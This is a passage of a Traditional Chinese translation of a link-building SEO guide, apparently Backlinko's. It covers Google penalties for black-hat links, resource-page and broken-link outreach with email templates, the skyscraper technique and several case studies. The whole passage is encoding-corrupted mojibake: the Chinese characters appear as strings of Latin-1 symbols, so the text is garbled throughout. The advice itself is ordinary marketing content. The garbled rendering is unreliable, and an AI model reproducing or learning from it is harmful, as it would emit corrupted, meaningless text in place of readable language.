çš„ä¸»é¡Œï¼‰ç™¼å¸ƒäº†ä¸€å€‹æ–°æŒ‡å—ï¼šï¼ˆç¶²å€ï¼‰ã€‚\nä½œç‚ºä¸€ä½åœ¨æ’°å¯«é—œæ–¼ï¼ˆæŸä¸»é¡Œï¼‰çš„äººï¼Œæˆ‘èªç‚ºä½ ä¹Ÿæœƒå–œæ­¡å®ƒã€‚\næˆ‘çš„æŒ‡å—åŒæ¨£å¯èƒ½ï¼Œæˆç‚ºä½ ç¶²é ä¸Šçš„ä¸€å€‹ä¸éŒ¯çš„å»¶ä¼¸é–±è®€ã€‚\nä¸è«–å¦‚ä½•ï¼Œå¸Œæœ›ä½ ç¹¼çºŒåœ¨ï¼ˆå°æ–¹ç¶²ç«™ï¼‰æä¾›ç²¾å½©çš„ä½œå“ã€‚\næœ‰ç©ºå†èŠã€‚\n:::\næ³¨æ„åˆ°é€™å€‹ç¯„æœ¬ï¼Œå…§å«äº†è¨±å¤šå®¢è£½åŒ–çš„è³‡è¨Šï¼Œå»ä¸éœ€èŠ±è²»è¨±å¤šåŠ›æ°£ã€‚\nç¬¬ 5 ç« ï¼šé»‘å¸½é€£çµå„ªåŒ–çš„çœŸå¯¦æƒ…æ³ å¦‚æœæ²’æœ‰é—œæ–¼é»‘å¸½ SEO çš„ç« ç¯€ï¼Œä»»ä½•é€£çµå„ªåŒ–çš„æŒ‡å—éƒ½ä¸å®Œæ•´ã€‚\né»‘å¸½é€£çµå„ªåŒ–éå¸¸å®¹æ˜“è¢«ç™¼ç¾ï¼š\nå¦‚æœå–å¾—åå‘é€£ç¯€çš„æ–¹æ³•ï¼Œèˆ‡ Google çš„ç¶²ç«™æŒ‡å—é•èƒŒï¼Œå®ƒå¤§æ¦‚å°±æ˜¯é»‘å¸½ã€‚\né€™å°±è¡¨ç¤ºï¼Œä½ æ‡‰è©²é¿å…ä½¿ç”¨é»‘å¸½å„ªåŒ–é€£çµå—ï¼Ÿ\né€™å€‹é¸æ“‡å–æ±ºæ–¼ä½ ã€‚\næˆ‘å€‹äººä¸å»ºè­°ä½¿ç”¨é»‘å¸½å„ªåŒ–é€£çµï¼ˆé¢¨éšªèˆ‡å›å ±ä¸æˆæ¯”ä¾‹ï¼‰ã€‚\nè©±é›–å¦‚æ­¤ï¼Œä¸è«–ä½ æ˜¯ä¸€ä½ç™½å¸½æˆ–é»‘å¸½ SEOï¼Œä½ éƒ½éœ€è¦çŸ¥é“ Google çµ¦äºˆé»‘å¸½çš„æ‡²ç½°ã€‚\nå› æ­¤ï¼Œæˆ‘å€‘ç°¡å–®çµ±æ•´å®ƒå€‘ï¼š\nGoogle ä¼éµ å®ƒæ˜¯ä»€éº¼ï¼š ä¸€å€‹æ‡²ç½°æ¼”ç®—æ³•ï¼Œç”¨ä¾†é‡å°ä½¿ç”¨åƒåœ¾é€£çµå»ºç«‹æ¬Šé‡çš„ç‰¹å®šç¶²ç«™ã€‚\nä¾‹å¦‚ï¼Œå¯ç–‘çš„å®¢åº§æ–‡ç« æˆ–æ–‡ç« ç•™è¨€è™•çš„åƒåœ¾è¨Šæ¯ã€‚\nå¦‚ä½•é¿å…å®ƒï¼š åªæœ‰å»ºç«‹ç™½å¸½é€£çµèƒ½é¿å…ã€‚\næœ‰æ•¸æ“šé¡¯ç¤ºï¼Œä½ å¯ä»¥è—‰ç”±æœ€å°åŒ–å®Œå…¨åŒ¹å…‹éŒ¨é»æ–‡å­—ï¼Œç”¨ä»¥èº²é¿ä¼éµæ¼”ç®—æ³•ã€‚\n(æˆ‘èªªééŒ¨é»æ–‡å­—æ˜¯å¦ä¸€å€‹å…§å®¹äº†ï¼Œä½†å®ƒçš„é—œéµåœ¨æ–¼ä¿¡ä»»)\næ›å¥è©±èªªï¼Œèº²é¿ä¼éµæ¼”ç®—æ³•æœ€ç°¡å–®çš„æ–¹å¼ï¼Œå°±æ˜¯é¿å…ä½¿ç”¨å¯ç–‘çš„é€£çµï¼ˆæˆ–éŒ¨é»æ–‡å­—ï¼‰\næ‰‹å‹•æ‡²ç½°èˆ‡éè‡ªç„¶é€£çµ å®ƒæ˜¯ä»€éº¼ï¼š ä¸€ä½ä¾†è‡ª Google å…¬å¸å“¡å·¥çš„æ‰‹å‹•æ‡²ç½°ã€‚\nå®ƒèˆ‡ä¼éµæ¼”ç®—æ³•ä¸åŒï¼ŒGoogle å°‡æœƒè—‰ç”± Google Search Console å¯„çµ¦å¦³ä¸€å°è¨Šæ¯ã€‚\nå¦‚ä½•é¿å…å®ƒï¼š é™¤äº† Google ä»¥å¤–ï¼Œæ²’äººçŸ¥é“è‡ªå·±çš„ç¶²ç«™ç‚ºä»€éº¼è¢«æ‰‹å‹•æ‡²ç½°ã€‚\næˆ‘çš„çœ‹æ³•æ˜¯æœ‰æŸå€‹æ¼”ç®—æ³•ï¼ŒæŒ‡å‡ºä¸€å€‹ç¶²ç«™æ­£åœ¨ç©å¼„ç³»çµ±ã€‚\nå› æ­¤ï¼Œä»–å€‘å°‡ç¶²ç«™éæ¿¾å‡ºä¾†ä¸¦åšæ‰‹å‹•æª¢é©—ã€‚\nå¯çŸ¥ï¼Œæœ€å¥½çš„é¿å…æ–¹å¼æ˜¯æ“æœ‰ä¸€å€‹éå¸¸ä¹¾æ·¨çš„åå‘é€£çµæª”æ¡ˆã€‚\næ­¤å¤–ï¼Œä¸åƒä¼éµæ¼”ç®—æ³•ï¼Œä½ å¯ä»¥é€éã€Œç¦æ­¢é€£çµæŒ‡å‘ç¶²ç«™ã€èˆ‡ã€Œç”³è«‹é‡æ–°å¯©æŸ¥ã€å¾æ‰‹å‹•æ‡²ç½°ä¸­æ¢å¾©ã€‚\nç¬¬ 6 ç« ï¼šæˆ‘æœ€å–œæ­¡çš„ 3 å€‹é€£çµå„ªåŒ–ç­–ç•¥ï¼ˆæŒ‰æ­¥é©Ÿæ•™å­¸ï¼‰ æœ¬ç« ç¯€ä¸éœ€è¦å‰è¨€ã€‚\nä»¥ä¸‹æ˜¯æˆ‘ç”¨å¯¦æˆ°ç¶“é©—é©—è­‰ï¼Œå–å¾—ä¸–ç•Œç´šåå‘é€£çµçš„ 3 å€‹ç­–ç•¥ã€‚\nè³‡æºé é¢é€£çµå„ªåŒ– é¦–å…ˆï¼Œä»€éº¼æ˜¯è³‡æºé é¢ï¼Ÿ\nè³‡æºé é¢æ˜¯æŒ‡åœ¨ç‰¹å®šä¸»é¡Œä¸­ï¼Œæ•´åˆæ“æœ‰è‰¯å¥½å…§å®¹çš„é€£çµã€‚\nä»¥ä¸‹æ˜¯ç¯„ä¾‹ï¼š\nå› ç‚ºé€™äº›é é¢å­˜åœ¨çš„åŸå› ï¼Œæ˜¯å°‡ä½¿ç”¨è€…å°å‘é©åˆçš„åœ°æ–¹ã€‚\nå› æ­¤ï¼Œé€™æ˜¯å€‹çµ•ä½³çš„é€£çµå»ºç«‹ç­–ç•¥ã€‚\nä»¥ä¸‹æ˜¯å…·é«”æ­¥é©Ÿï¼š\næ­¥é©Ÿ 1ï¼šæ‰¾åˆ°è³‡æºé é¢ åœ¨ Google ä½¿ç”¨é€™äº›æœå°‹å­—è©ã€‚\nä»–å€‘æ˜¯å°ˆé–€è¨­è¨ˆç”¨ä¾†æŒ–æ˜è³‡æºé é¢ï¼š\né—œéµå­— + inurl:links é—œéµå­— + ã€Œæœ‰å¹«åŠ©çš„è³‡æºã€ é—œéµå­— + ã€Œæœ‰ç”¨çš„è³‡æºã€ é—œéµå­— + ã€Œæœ‰ç”¨çš„é€£çµã€ æ­¥é©Ÿ 2ï¼šæª¢è¦–è©²é é¢ ä»¥ä¸‹æ˜¯ä½ éœ€å¿«é€Ÿå›ç­”çš„å•é¡Œï¼š\nã€Œä¾†è‡ªé€™å€‹ç¶²é çš„é€£çµï¼Œå€¼å¾—åŠªåŠ›çˆ­å–å—ï¼Ÿã€\nï¼ˆæé†’ï¼šä½¿ç”¨ç¬¬ 2 ç« çš„æŠ€å·§ç°¡åŒ–æ­¤æ­¥é©Ÿï¼‰\nèˆ‰ä¾‹ä¾†èªªï¼Œé€™å€‹è³‡æºé æ“æœ‰ä¸€å€‹é«”é¢çš„ URL åˆ†æ•¸ï¼š12ï¼Œé‚„ä¸éŒ¯ã€‚\nå®ƒåŒæ¨£æ“æœ‰ä¸€å€‹å…·æ¬Šå¨æ€§çš„ç¶²ç«™ã€‚\nè€Œæˆ‘çš„é€£çµï¼Œæœ€å¾Œå°‡æœƒåœ¨æ­¤ç¶²é çš„ä¸»é«”å€å¡Šï¼Œå¦‚åŒå‹åˆ©è€…èˆ¬ã€‚\næ­¥é©Ÿ 3ï¼šæ‰¾åˆ°æœ€ç¬¦åˆçš„å…§å®¹ æ³¨æ„ï¼š\nä½ å¯èƒ½æ“æœ‰æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„å…§å®¹ï¼Œä½†å¦‚æœå®ƒèˆ‡è³‡æºé çš„ä¸»é¡Œä¸ç›¸æ­å‘¢ï¼Ÿ\nä½ å°‡ä¸æœƒå–å¾—è©²é€£çµã€‚\nå› æ­¤æ­¤æ­¥é©Ÿçš„ç›®çš„ï¼Œæ˜¯è¦æ‰¾å‡ºèˆ‡ä½ å…§å®¹ç›¸ç¬¦çš„è³‡æºé é¢ã€‚\nä¾ä½†ä½ è­˜åˆ¥å‡ºå…§å®¹ï¼Œè·³è‡³ç¬¬å››æ­¥é©Ÿ\næ­¥é©Ÿ 4ï¼šå¯„é€æ­¤å°ç¶“æ¸¬è©¦çš„æ¨¡æ¿ ä»¥ä¸‹æ˜¯æˆ‘å»ºè­°çš„æ¨¡æ¿ï¼š\n:::info\næ¨™é¡Œï¼šé—œæ–¼ï¼ˆå°æ–¹ç¶²ç«™ï¼‰çš„å•é¡Œ\n\u0026ndash;\nå—¨ï¼ˆåå­—ï¼‰ã€‚\nä»Šæ—©ï¼Œæˆ‘åœ¨ Google æœå°‹é—œæ–¼ï¼ˆä¸»é¡Œï¼‰çš„å…§å®¹æ™‚ï¼Œçœ‹åˆ°ä½ çš„å„ªè³ªè³‡æºé ï¼šï¼ˆç¶²å€ï¼‰\næˆ‘åªæ˜¯æƒ³è¦è·Ÿä½ èªªï¼šä½ çš„ç¶²é å¹«äº†æˆ‘å¾ˆå¤§çš„å¿™ã€‚\nå¦‚æœæ²’æœ‰æ­¤ç¶²é ï¼Œæˆ‘å°‡æ°¸é ä¸æœƒæ‰¾åˆ°ï¼ˆè©²ç¶²ç«™é€£çµçš„è³‡æºï¼‰ã€‚\næœ‰è¶£çš„äº‹ï¼šæˆ‘ä¸Šå€‹æœˆå‰›ç™¼å¸ƒäº†ä¸€å€‹é—œæ–¼ï¼ˆä¸»é¡Œï¼‰çš„æŒ‡å—ï¼Œå®ƒæ˜¯ï¼ˆç°¡çŸ­æ‘˜è¦ï¼‰ã€‚\nå¦‚æœä½ æƒ³æŸ¥çœ‹è©²å…§å®¹ï¼Œä»¥ä¸‹æ˜¯é€£çµï¼šï¼ˆï¼‰\næ­¤å¤–ï¼Œæˆ‘çš„æŒ‡å—ä¹Ÿå¯èƒ½æ˜¯é©åˆæ·»åŠ åˆ°ä½ çš„ç¶²é ã€‚\nä¸è«–å¦‚ä½•ï¼Œè¬è¬ä½ å°‡ç›¸é—œè³‡æºæ¢åˆ—æ•´ç†ã€‚\nç¥ä½ æœ‰å€‹ç¾å¥½çš„ä¸€å¤©ï¼\næœŸå¾…å›å¾©ã€‚\nï¼ˆä½ çš„åå­—ï¼‰\n:::\n:::danger\nå¦‚åŒæ‰€æœ‰å¤–éƒ¨æ¥è§¸çš„æ¨¡æ¿ï¼Œç¢ºä¿æ­¤æ¨¡æ¿ç›¡å¯èƒ½å®¢è£½åŒ–ã€‚\nä½ å¯ä»¥ä½¿ç”¨ä¸€å€‹ã€Œçœ‹èµ·ä¾†ä¸€é»éƒ½ä¸åƒæ¨¡æ¿ã€çš„æ¨¡æ¿ã€‚\n:::\nç ´æé€£çµå„ªåŒ– ã€Œç ´æé€£çµå„ªåŒ–ã€ä¸€ç›´æ˜¯æˆ‘æœ€å–œæ­¡çš„å„ªåŒ–ç­–ç•¥ã€‚\nç‚ºä»€éº¼ï¼Ÿ\né€éç ´æé€£çµå„ªåŒ–ï¼Œä½ å¯ä»¥æ›¿æŸäººçš„ç¶²ç«™æé«˜åƒ¹å€¼ï¼Œè€Œéç›´æ¥è«‹æ±‚é€£çµã€‚\nä»¥ä¸‹æ˜¯åŸ·è¡Œæ­¥é©Ÿï¼š\n1. å®‰è£ Check My Links æˆ– LinkMiner ä¸Šè¿°å…©è€…å·¥å…·ï¼Œéƒ½èƒ½å¿«é€Ÿæ‰¾åˆ°ä»»ä½•ç¶²é çš„ç ´æé€£çµï¼ˆé€éä½ çš„ Chrome ç€è¦½å™¨ï¼‰ã€‚\næˆ‘å°‡æœƒåœ¨æ¥ä¸‹å¹¾åˆ†é˜ï¼Œç·šä½ å±•ç¤ºå¦‚ä½•ä½¿ç”¨å®ƒå€‘ã€‚\n2. æ‰¾åˆ°æ“æœ‰è¨±å¤šå¤–éƒ¨é€£çµçš„é é¢ ä¸€å€‹ç¶²é è¶Šå¤šé€£çµï¼Œä»–å€‘ä¹‹ä¸­è¶Šæœ‰å¯èƒ½æœƒç”¢ç”Ÿç ´æé€£çµã€‚\nè³‡æºé éå¸¸é©ç”¨æ–¼æ­¤æƒ…æ³ã€‚\nå› æ­¤ï¼Œè«‹ç›¡æƒ…ä½¿ç”¨ä¸Šæ–‡çš„æœå°‹å­—ä¸²ï¼Œæ‰¾å‡ºç›¸æ‡‰çš„è³‡æºé ã€‚\n4. æŸ¥çœ‹ç ´æé€£çµ ä»¥ä¸‹ï¼Œæ˜¯ä½ åŸ·è¡Œåœ¨æ­¥é©Ÿä¸€å®‰è£çš„å¤–æ›çš„åœ°æ–¹ã€‚\nå®ƒå°‡æœƒé€æ¼è©²é é¢çš„ç ´æé€£çµï¼š\n4. å¯„é€éƒµä»¶çµ¦è©²ç¶²ç«™ç®¡ç†å“¡ï¼Œå‘ŠçŸ¥é—œæ–¼ç ´æé€£çµçš„äº‹æƒ… æœ€å¾Œï¼Œè®“ç¶“ç‡Ÿè©²ç¶²é çš„äººï¼ŒçŸ¥é“è©²é çš„ç ´æé€£çµï¼Œä¸¦ä½œç‚ºäº¤æ›ï¼Œè®“å°æ–¹é€£çµä½ çš„ç¶²ç«™ã€‚\nä»¥ä¸‹æ˜¯æˆ‘å»ºè­°çš„æ¨¡æ¿ï¼š\n:::info\næ¨™é¡Œï¼šï¼ˆå°æ–¹ç¶²ç«™åç¨±ï¼‰çš„å•é¡Œ\n\u0026ndash;\nä½ å¥½(å§“å)ï¼Œè«‹å•ä½ é‚„æœ‰å†æ›´æ–°ä½ çš„ç¶²ç«™å—ï¼Ÿ\næˆ‘åœ¨æœå°‹ï¼ˆä¸»é¡Œï¼‰çš„å…§å®¹æ™‚ï¼Œç™¼ç¾ä½ çµ•ä½³çš„ç¶²é ï¼šï¼ˆç¶²é æ¨™é¡Œæˆ–ç¶²å€ï¼‰\nç„¶è€Œï¼Œæˆ‘ç™¼ç¾æœ‰å¹¾å‰‡é€£çµæ˜¯å¦å·²å¤±æ•ˆï¼š\nï¼ˆç ´æé€£çµçš„ç¶²å€ï¼‰\næ­¤å¤–ï¼Œæˆ‘æœ€è¿‘ç™¼å¸ƒï¼ˆç°¡çŸ­çš„å…§å®¹æè¿°ï¼‰ã€‚\nå®ƒå¯èƒ½é©åˆå–ä»£ï¼ˆæŒ‡å‡ºç‰¹å®šçš„ç ´æé€£çµï¼‰ã€‚\nä¸è«–å¦‚ä½•ï¼Œå¸Œæœ›é€™æœ‰å¹«åŠ©åˆ°ä½ ã€‚\nè¬è¬\nï¼ˆä½ çš„åå­—ï¼‰\n:::\næ‘©å¤©å¤§æ¨“æŠ€è¡“ é€™éƒ¨å½±ç‰‡å°‡æ‰‹æŠŠæ‰‹ï¼Œå¸¶ä½ èµ°éå…¨éƒ¨æµç¨‹ã€‚\n{%youtube 263xIymvLl4 %}\nä¸€æ—¦ä½ è§€çœ‹å®Œæ­¤å½±ç‰‡ï¼Œå°±æ˜¯æ™‚å€™é€²å…¥ä¸‹ä¸€ç« ç¯€ï¼š\néå¸¸æ£’çš„é€£çµå„ªåŒ–æ¡ˆä¾‹ç ”ç©¶ï¼\nç¬¬ 7 ç« ï¼šé©šäººçš„æ¡ˆä¾‹ç ”ç©¶ ç¾åœ¨ï¼Œæ˜¯æ™‚å€™å‘ä½ å±•ç¾é€£çµå„ªåŒ–å¯¦éš›çš„ä¾‹å­ã€‚\næœ€æ£’çš„éƒ¨åˆ†æ˜¯ï¼Œæˆ‘ä¹‹å‰å¾ä¾†æ²’æœ‰åˆ†äº«éé€™äº›å…§å®¹ã€‚\næ¡ˆä¾‹ä¸€ Julie å¦‚ä½•ä½¿ç”¨æ‘©å¤©å¤§æ¨“æŠ€å·§ï¼Œå¢åŠ  194.1% çš„è‡ªç„¶æœå°‹æµé‡ Julie Adams çš„éƒ¨è½æ ¼ï¼šæˆ‘å€‘ç¾éº—çš„æ˜Ÿçƒï¼Œæ›¾ç¶“éå¸¸æ™æ‰ã€‚\nç¢ºå¯¦ï¼ŒJulieã€€æ›¾ç™¼å¸ƒè¨±å¤šè‰¯å¥½çš„å…§å®¹ï¼Œå–®åœ¨å¥¹çš„è¨€è©ä¸­è¡¨ç¤ºï¼šä¸è«–æˆ‘çš„å…§å®¹æœ‰å¤šæ£’ï¼Œéƒ½æ²’æœ‰ä»»ä½•åå‘é€£çµã€‚\né€™å°±æ˜¯å¥¹æ±ºå®šä½¿ç”¨ã€Œæ‘©å¤©å¤§æ¨“æŠ€è¡“ã€çš„æ™‚æ©Ÿé»ã€‚\nå› æ­¤ï¼Œå¥¹ä¸å†åªæ˜¯å–®ç´”ç™¼å¸ƒå¦ä¸€å€‹è‰¯å¥½å…§å®¹ï¼Œè€Œæ˜¯å‰µé€ å‡ºé©šäººçš„äº‹ç‰©ã€‚\nä»¥ä¸‹æ˜¯ä¾‹å­ï¼š\nå¥¹ä½¿ç”¨é›»å­éƒµä»¶æ¨å»£å»å‰µç«‹åå‘é€£çµï¼Œè€Œéå–®ç´”å‰µé€ å¥½å…§å®¹ä¸¦ç­‰å¾…è¢«æ¨å»£ã€‚\né€™ä½¿å¥¹å–å¾—å¾è‡ªç„¶é ˜åŸŸçš„æ¬Šå¨ç¶²ç«™ï¼Œå–å¾—æ»¿æ‰‹çš„é€£çµã€‚\né€™äº›ç™½å¸½åå‘é€£çµï¼Œä½¿å¥¹è‡ªç„¶æœå°‹å¢åŠ äº† 194%ã€‚\nç‚ºä½•ã€Œæ‘©å¤©å¤§æ¨“æŠ€è¡“ã€é‹ä½œå¾—å¦‚æ­¤è‰¯å¥½ï¼Ÿ\n:::info\næ ¹æ“š Julie æ‰€èªªï¼š\nã€Œè®“é€™ä»¶äº‹å¦‚æ­¤æˆåŠŸçš„åŸå› ï¼Œåœ¨æ–¼å»ºç«‹åå‘é€£ç¯€å°±åƒèˆ‡ä»–äººå»ºç«‹é—œä¿‚ã€‚ã€\nã€Œäººå€‘åœ¨çŸ¥é“ä½ çš„ç¶²ç«™å­˜åœ¨å‰ï¼Œä¸æœƒé€£çµä½ çš„å…§å®¹ã€‚ã€\nã€Œæ­¤å¤–ï¼Œåœ¨ä½ ä¸»å‹•å‘Šè¨´ä»–å€‘ä»¥å‰ï¼Œä¹Ÿä¸æœƒçŸ¥é“ä½ çš„ç¶²ç«™å­˜åœ¨ã€‚ã€\n:::\nèªªçš„éå¸¸å¥½ã€‚\næ¡ˆä¾‹äºŒ ç ´æé€£çµå„ªåŒ–çš„å›å ± å»å¹´ï¼Œæˆ‘æ±ºå®šåŸ·è¡Œç ´æé€£çµå„ªåŒ–çš„è¡ŒéŠ·æ´»å‹•ã€‚\nå› æ­¤ï¼Œæˆ‘éµå¾ªåœ¨ä¸Šä¸€ç« ç¯€çš„æµç¨‹ã€‚\né¦–å…ˆï¼Œæˆ‘ä½¿ç”¨æœå°‹å­—ä¸²ï¼Œä»¥æ‰¾å‡ºå«æœ‰è¨±å¤šå¤–éƒ¨é€£çµçš„ç¶²é ã€‚\næ¥è‘—ï¼Œæˆ‘ä½¿ç”¨ Check My Links æ‰¾å‡ºç ´æçš„é€£çµã€‚\nä¹‹å¾Œï¼Œæˆ‘å¯„ä¿¡çµ¦è² è²¬è©²å…§å®¹çš„äººï¼Œä¸¦è¡¨ç¤ºè‡ªå·±æœ‰ç™¼ç¾çš„ç ´æé€£çµå­˜åœ¨ã€‚\nï¼ˆä»”ç´°æŸ¥çœ‹è©²ä¿¡ä»¶æœ‰å¤šéº¼å®¢è£½åŒ–ï¼‰\næ”¶åˆ°å°æ–¹çš„å›æ‡‰å¾Œï¼Œæˆ‘å¯„çµ¦ä»–å€‘é‚£äº›å¤±æ•ˆçš„é€£çµï¼Œä»¥åŠä¾†è‡ª Backlinko çš„ä¸€å¤§å †å…§å®¹ï¼Œç”¨ä»¥é€²è¡Œ 1:1 æ›¿æ›ã€‚\nè€Œå¤§å¤šæ•¸çš„å¤¥ä¼´ï¼Œéƒ½éå¸¸æ¨‚æ„å¢æ·»æˆ‘çš„é€£çµï¼š\næ¡ˆä¾‹ä¸‰ Matt å¦‚ä½•å„ªåŒ–å®ƒçš„é›»å­å•†å‹™é€£çµ è®“æˆ‘å€‘é¢å°ä¸€å€‹äº‹å¯¦ï¼š\nå»ºç«‹åå‘é€£çµï¼Œå°é›»å•†ç¶²ç«™ä¾†èªªä¸¦ä¸å®¹æ˜“ã€‚\nä½†ä»–ä»æœ‰å¯èƒ½ï¼Œå°±å¦‚åŒ Matt Lawry ä¸€æ¨£ã€‚\nå¦‚åŒå¤šæ•¸é›»å•†ç¶²ç«™æ“æœ‰è€…ï¼ŒMatt å°æ–¼å»ºç«‹ä»–é›»å•†ç¶²ç«™çš„é€£çµæœ‰éº»ç…©ï¼ˆä¸€å€‹å°ˆæ³¨åœ¨ç¦®ç‰©çš„æ¾³æ´²ç¶²ç«™ï¼‰\nç•¢ç«Ÿï¼Œæœ‰èª°æƒ³è¦é€£çµåˆ°ä¸€å€‹ 100% ç”¢å“å°å‘çš„é é¢ã€‚\né€™è®“ Matt äº†è§£åˆ°ï¼Œå®ƒå¯ä»¥ä½¿ç”¨å…§å®¹ç‚ºç¶²ç«™å‰µé€ åå‘é€£çµã€‚\nå…·é«”ä¾†èªªï¼ŒMatt åœ¨å®ƒçš„ç¶²ç«™å‰µé€ ä¸€ç¯‡ã€Œæ‘©å¤©å¤§æ¨“ã€å…§å®¹ï¼šã€Šæ¾³æ´²ç´é…’ï¼šçµ‚æ¥µæŒ‡å—ã€‹\nç•¶ç„¶ï¼ŒMatt ä¸¦æ²’æœ‰åä¸‹ä¾†ä¸¦ç­‰å¾…é€£çµç´¯ç©ã€‚\nä»–é€éé›»å­éƒµä»¶ï¼Œä¸»å‹•æ¨å»£è‡ªå·±çš„å…§å®¹ã€‚\nå› ç‚º Matt è¯ç¹«ä¸Šæ­£ç¢ºçš„äººï¼ˆä¸¦å¯„çµ¦ä»–å€‘å®¢è£½åŒ–çš„é›»å­éƒµä»¶ï¼‰ï¼Œè¨±å¤šäººé¡˜æ„æä¾›é€£æ¥çµ¦ä»–çš„æŒ‡å—ã€‚\né€™äº›é€£çµéƒ½åŠ å¼·äº† Matt çš„é›»å•†ç¶²ç«™ï¼Œåœ¨æœå°‹çµæœé æƒ³è¦çˆ­å–çš„é—œéµå­—ï¼šæ¾³æ´²ç´é…’ã€‚\nç¬¬ 8 ç« ï¼šé€²éšé€£çµå„ªåŒ–æŠ€å·§ ä»¥ä¸‹æ¸…å–®ï¼Œæ˜¯æˆ‘ç‚ºäº†æŒ‘é¸é€™å¹¾å¹´ï¼Œä¸€äº›é€²éšé€£çµå„ªåŒ–çš„æŠ€å·§ã€‚\nå¾ã€Œé€£çµå›æ”¶ã€è¼•é¬†å–å¾—åå‘é€£çµ æ¯ç•¶æœ‰äººåœ¨æ–‡ç« ä¸­æåŠä½ çš„å“ç‰Œï¼Œä»–å€‘éƒ½æœƒé€£çµä½ å°å§ï¼Ÿ\néŒ¯ã€‚\næˆ‘çš„æ„æ€æŒ‡ï¼Œä»–å€‘ã€Œæ‡‰è©²ã€é€£çµä½ ï¼Œä½†ä¸¦éç¸½æ˜¯æœƒç™¼ç”Ÿã€‚\nä»¥ä¸‹æ˜¯æˆ‘æƒ³è¡¨é”çš„æ„æ€ï¼š\nä½†è—‰ç”±è¼•æ¨ä¸€æŠŠï¼Œå¤šæ•¸ç¶²ç«™æ“æœ‰äººéƒ½éå¸¸æ¨‚æ„ï¼Œå°‡æåŠä½ çš„éƒ¨åˆ†è½‰æˆä¸€å€‹é€£çµã€‚\nä½ è¦å¦‚ä½•ç™¼ç¾äº›æœªå«é€£çµçš„æåŠå‘¢ï¼ŸBuzzSumo æ•ˆæœéå¸¸å¥½ã€‚\né€éåå‘åœ–ç‰‡æœå°‹ï¼Œå–å¾—ã€Œé¡å¤–ã€é€£çµ è«‹å•ä½ æ˜¯å¦ç™¼å¸ƒè¦–è¦ºè³‡ç”¢ï¼ˆå¦‚è³‡è¨Šåœ–è¡¨ã€ç¤ºæ„åœ–ï¼‰ï¼Ÿ\nå¦‚æœæœ‰ï¼Œé‚£ç¾åœ¨å¯èƒ½æœ‰æŸäº›ç¶²ç«™æ­£ä½¿ç”¨ä½ çš„åœ–ç‰‡ï¼Œå»æ²’æœ‰è¨»æ˜ä¾†æºã€‚\nä¸è¦åš‡åˆ°ã€‚äº‹å¯¦ä¸Šï¼Œä½ æ‡‰è©²æ…¶ç¥ã€‚\nå¦‚åŒé€£çµé‡æ–°å–å¾—ï¼Œä¸€å°å‹å–„çš„éƒµä»¶å¯ä»¥å°‡é€™äº›æ©Ÿæœƒè½‰æˆé€£çµã€‚\nä½ å¯ä»¥ä½¿ç”¨ Google ä»¥åœ–æœå°‹ï¼Œæ‰¾åˆ°é‚£äº›ä½¿ç”¨ä½ åœ–ç‰‡ï¼Œå»æ²’æœ‰æ·»åŠ é€£çµçš„äººå€‘ :\nåœ¨ä¸‹åˆå¯„é€é›»å­éƒµä»¶ ä»¥ä¸‹æ˜¯æˆ‘å¯„é€ä¸Šåƒå°é›»å­éƒµä»¶å¾Œï¼Œå¾ä¸­å­¸åˆ°çš„äº‹æƒ…ã€‚\nåœ¨ä¸‹åˆï¼ˆæ”¶ä»¶è€…æœ¬åœ°æ™‚é–“ï¼‰å¯„é€ä½ çš„æ¨å»£é›»å­éƒµä»¶ã€‚\nç‚ºä»€éº¼ï¼Ÿ\nç•¶ä½ åœ¨æ—©ä¸Šå¯„é€ä½ çš„è¨Šæ¯ï¼Œå®ƒå°‡æœƒè¢«æ”¶ä»¶è€…ï¼Œèˆ‡å…¶ä»– 93 å°è¨Šæ¯æ··åœ¨ä¸€èµ·è™•ç†ã€‚\nä½†ç•¶ä½ åœ¨ä¸‹åˆå¯„é€é›»å­ï¼Œæ”¶ä»¶å¤¾å°±æœƒå°‘æ‰è¨±å¤šç«¶çˆ­è€…ã€‚\næˆ‘æ¨è–¦ Gmail å…§å»ºçš„æ™‚é–“æ’æˆåŠŸèƒ½ï¼Œå¹«ä½ è¦ç•«æ¨å»£ä¿¡ç™¼é€æ™‚é–“ã€‚\nå‰µé€ è¦–è¦ºåŒ–çš„æ¦‚å¿µã€é»å­èˆ‡ç­–ç•¥ ä»¥ä¸‹æ˜¯ä¾†è‡ª Backlinko å¯¦éš›çš„ä½œç‚ºï¼š\nä¸ç®¡ä½ ç›¸ä¸ç›¸ä¿¡ï¼Œè¨±å¤šäººéƒ½å› ç‚ºé€™å¼µç°¡å–®ç‰‡èˆ‡æˆ‘é€£çµï¼š\nç‚ºä½•å®ƒå¦‚æ­¤æœ‰æ•ˆï¼Ÿ\næ©\u0026hellip;æˆ‘å¯ä»¥å–®ç´”é€éæ–‡å­—æè¿° APP æ”»å‹¢ï¼Œä½†é€™å°‡ä½¿æˆ‘çš„å…§å®¹æ¯”è¼ƒä¸å®¹æ˜“åˆ†äº«ã€‚\nå¦ä¸€æ–¹é¢ï¼Œç•¶ä½ å‰µé€ ä¸€å€‹è¦–è¦ºåœ–åƒï¼Œä½ å°‡æœƒæ“æœ‰éƒ¨è½å®¢æ¨‚æ–¼åˆ†äº«çš„å…§å®¹ï¼ˆä¸¦é€£çµä½ çš„ç¶²ç«™ï¼‰ã€‚\nåœ¨çµæŸå‰å¯„é€è©¦æ¢éƒµä»¶ ä½ æ‡‰è©²åœ¨ç¬¬ä¸€å°é›»å­éƒµä»¶æ¨å»£ä¸­ï¼Œè¦æ±‚å°æ–¹æä¾›åå‘é€£çµå—ï¼Ÿ\nç°¡çŸ­å›ç­”ï¼šå¯èƒ½å¯ä»¥ã€‚\nä½ ä¹Ÿå¯ä»¥é€éå…©éšæ®µæµç¨‹ï¼Œå–å¾—æ›´å¥½çš„çµæœã€‚\nï¼ˆBacklinko è®€è€… Mike ç™¼ç¾æ¸¬è©¦éƒµä»¶çš„æˆæ•ˆï¼Œè¼¾å£“ç›´æ¥è¦æ±‚é€£çµçš„æ–¹å¼ï¼‰\né€™å€‹æ–¹æ³•çš„å¦ä¸€å€‹å¥½è™•ï¼Œå¯ä»¥æ¸›å°‘ä½ èŠ±è²»çš„æ™‚é–“ã€‚\nèˆ‡å…¶èŠ±è²»æ™‚é–“ï¼Œå®¢è£½åŒ–ä¸€å°æ²’äººé–±è®€çš„è¨Šæ¯ï¼Œå…ˆå¯„é€ç°¡çŸ­è©¦æ¢éƒµä»¶æ›´å¥½ã€‚\nä¹‹å¾Œï¼Œå†é‡å°ä½ 